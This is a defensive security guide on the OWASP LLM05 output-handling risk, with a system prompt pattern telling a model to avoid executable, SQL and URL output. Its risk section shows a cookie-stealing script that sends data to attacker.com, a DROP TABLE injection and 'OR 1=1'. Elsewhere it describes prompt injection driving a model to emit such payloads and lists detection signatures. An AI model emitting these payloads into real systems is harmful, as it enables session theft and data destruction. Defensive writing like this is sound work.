# LLM05: Output Sanitization System Prompt Pattern

**OWASP Risk:** LLM05:2025 Improper Output Handling  
**Source:** [OWASP LLM Top 10 v2.0](../reference/owasp-llm-top10-v2.0.md)  
**Mitigations addressed:** Zero-trust output treatment, context-appropriate encoding, parameterized query enforcement, executable output prevention

---

## The Risk

LLM outputs are not inherently safe. When a model's response is passed directly to a browser, database, shell, or execution environment, without sanitization, it becomes an injection vector. The LLM itself may have been manipulated (via prompt injection) into generating a payload; the downstream system then executes it.

In a financial services context: a reporting tool uses an LLM to translate plain-English queries into SQL. A user asks "show me all accounts opened this year." An attacker crafts a query that causes the model to emit: `SELECT * FROM accounts; DROP TABLE transactions;` and the application executes it directly. This is LLM05, not a model failure, but an output handling failure.

A second scenario: a customer-facing chatbot renders its responses in a React frontend. An attacker injects a prompt that causes the model to output `<script>document.location='https://attacker.com?c='+document.cookie</script>`. If the frontend renders it without escaping, the user's session is exfiltrated.

---

## Defensive System Prompt Pattern

```
OUTPUT FORMAT
Respond only in [specify: plain text / structured JSON / Markdown].
Do not embed HTML tags, script elements, or code unless you are explicitly operating
as a code generation assistant. If code output is within your defined scope, wrap it
in fenced code blocks only; never produce bare executable content.

SQL AND QUERY SAFETY
If your role includes generating database queries, produce query templates only;
use parameter placeholders (e.g., $1, ?, :param) for all user-supplied values.
Never interpolate user input directly into a query string.
If a request cannot be expressed safely as a parameterized query, respond:
"I can't generate that query safely. Please rephrase or contact [escalation path]."

EXECUTABLE CONTENT
Do not produce shell commands, eval()-ready code, file paths constructed from user
input, or content that could be interpreted as system instructions.
If a user requests executable output outside your defined scope, decline.

STRUCTURED OUTPUT INTEGRITY
If you are producing JSON, XML, or another structured format, validate that your
output conforms to the expected schema. Do not include fields, keys, or values
that were not requested. Do not allow user input to alter the structure of your
output, only its permitted content fields.

LINK AND URL HANDLING
Do not generate URLs, href values, or redirect targets based on user input.
If a resource link is required, use only pre-approved, hardcoded references
from your context. Never construct URLs by concatenating user-supplied strings.
```

---

## What Each Section Defends Against

| Section | Attack it prevents |
|---------|-------------------|
| Output Format | Unfiltered Markdown or HTML rendered by frontend (XSS, stored injection) |
| SQL and Query Safety | LLM-generated SQL injection: attacker-controlled query construction |
| Executable Content | Shell injection, `exec()`/`eval()` attacks, path traversal via model output |
| Structured Output Integrity | Schema pollution: attacker adding fields to alter downstream system behavior |
| Link and URL Handling | Open redirect, SSRF via model-generated URLs constructed from user input |

---

## Usage Notes

**The prompt is a secondary control.** The primary control is application-layer sanitization: encode output for the target context (HTML escape for browsers, parameterize for databases, shell-escape for CLI). This prompt reduces the likelihood of the model generating dangerous content; it does not eliminate the need for downstream validation.

**Context-specific encoding matters.** "Sanitize output" is not one operation. JavaScript context requires different escaping than HTML attribute context, SQL, or shell. Apply encoding rules at the point of use, not generically. Follow [OWASP ASVS](https://owasp.org/www-project-application-security-verification-standard/) guidelines for each target context.

**For SQL-generating assistants:** Never pass model-generated SQL directly to a database driver. Extract the template, bind parameters separately. If your stack does not support parameterized queries, do not use an LLM for query generation.

**For code-generating assistants:** This pattern does not apply; code output is the intended function. Apply SAST (static analysis) on generated code before execution, and sandbox the execution environment. LLM05 still applies to any non-code fields in the output (comments, metadata, file names).

**Monitor output patterns.** Log and alert on model outputs that contain `<script`, `eval(`, `exec(`, `DROP TABLE`, `--`, or other injection signatures. These patterns in outputs indicate either a compromised prompt or a model failure that warrants review.

**Known limitations of this pattern.** Instructions to avoid executable output or conform to a schema are best-effort signals; the model cannot enforce them with certainty. A manipulated or poorly calibrated model may still produce dangerous output despite these instructions. The STRUCTURED OUTPUT INTEGRITY section in particular: a model cannot actually validate its output against a formal schema. It can attempt to conform to one, but application-layer schema validation is required and cannot be replaced by this instruction. Treat this entire prompt as a secondary control; the primary controls are application-layer encoding, parameterized queries, and output sandboxing.

---

## Real-World Reference

- **[Technique] LLM-to-SQL injection**: A natural language query interface passes model output to a database without parameterization. An attacker crafts a prompt causing the model to append `OR 1=1` or a destructive statement to the generated query. Reproduced in multiple published AI security red team exercises; no single canonical public incident. Mitigation: parameterize at the driver layer regardless of what the model emits.
- **[Technique] Markdown XSS in chat interfaces**: Documented by multiple security researchers: LLM chat interfaces that render model output as Markdown without sanitization can be exploited via injected `<img onerror=...>` or `<a href="javascript:...">` patterns embedded in model responses. Affected multiple commercial products in 2023–2024; vendors have since patched via allowlist-based Markdown rendering. Mitigation: sanitize Markdown to a safe allowlist before render (e.g., DOMPurify).

---

## Attribution

Built by [Neville Ko](https://www.linkedin.com/in/nevilleko/) · [GitHub](https://github.com/nenedesign).  
Derived from [OWASP Top 10 for Large Language Model Applications v2.0](https://genai.owasp.org/llm-top-10/), copyright © OWASP Foundation, published March 12, 2025, used under the [Creative Commons Attribution 4.0 International License](https://creativecommons.org/licenses/by/4.0/).

---

## Disclaimer

This document is provided for educational and informational purposes only. The prompt patterns and guidance presented here are general-purpose starting points and do not constitute legal, compliance, or security advice. They have not been certified or validated against any specific regulatory framework, audit standard, or threat model.

Organizations deploying LLMs in regulated environments should conduct independent security assessments and consult qualified legal, compliance, and cybersecurity professionals before relying on any system prompt pattern as a compliance control.
